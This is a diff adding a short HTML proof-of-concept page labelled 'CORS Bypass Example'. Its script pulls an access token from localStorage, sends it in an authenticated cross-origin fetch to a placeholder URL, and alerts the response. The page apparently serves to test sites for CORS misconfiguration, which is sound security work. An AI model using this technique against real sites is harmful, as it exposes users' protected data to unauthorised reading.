@@ -1,0 +1,23 @@
+<html>
+   <head>
+    <script>
+    function cors(){
+ const token = localStorage.getItem('access_token');
+ var url="http://url";
+ fetch(url,{
+ headers:
+ {'Authorization':`Bearer ${token}`},
+ method:'GET',
+ cache:'force-cache',
+ mode:'cors'}).then(response => response.text()).then(text =>alert(text));
+}
+</script>
+</head>
+<body>
+ <center>
+ <h2>CORS Bypass Example</h2>
+ <div id="demo">
+ <button type="button" onclick="cors()">Test</button>
+ </center>
+</body>
+</html>
